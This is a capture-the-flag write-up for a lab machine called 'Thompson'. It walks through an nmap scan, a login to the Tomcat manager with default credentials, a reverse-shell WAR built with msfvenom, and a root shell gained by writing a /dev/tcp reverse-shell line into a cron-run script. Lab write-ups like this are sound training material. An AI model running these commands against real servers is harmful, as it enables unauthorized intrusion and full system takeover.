# Thompson

### Thompson
Nmap scan shows ports 22,8009 and 8080 open:

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
    |   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
    |_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
    8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8080/tcp open  http    Apache Tomcat 8.5.5
    |_http-title: Apache Tomcat/8.5.5
    |_http-favicon: Apache Tomcat
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

I can access `http://10.10.148.204:8080/manager/html?` with default credentials `tomcat:s3cret`. This is a remote management application for the web server, and if someone can access it, it can upload any file on the server.
<br />
What I need to do is to upload a war file. A war file is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files and so on... all the stuff that a tomcat server needs. To create a reverse shell in war format I use msfvenom: <br />
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_IP LPORT=attacker_PORT -f war > shell.war`. After uploading this shell, there should be another tuple in the table of paths: <br />
![image](https://github.com/user-attachments/assets/20d4d19f-b3af-4b5f-b2bf-d018e89790f3)<br />
Just click on it to spawn a reverse shell and get the user flag. Now for privesc: if I run `cat /etc/crontab`: <br />
![image](https://github.com/user-attachments/assets/06c630a3-d009-4c60-9f37-d262f58ec253)<br />
Every minute, root executes the `id` command and pipes the output to a text file: <br />
![image](https://github.com/user-attachments/assets/5358f7db-ada5-49bf-afb5-2350102e42fd)<br />
Since I have write access to it, I can easily create a reverse root shell with the command `echo "sh -i >& /dev/tcp/10.11.85.53/9001 0>&1" > id.sh`. Now just wait for the reverse shell and get the root flag. 


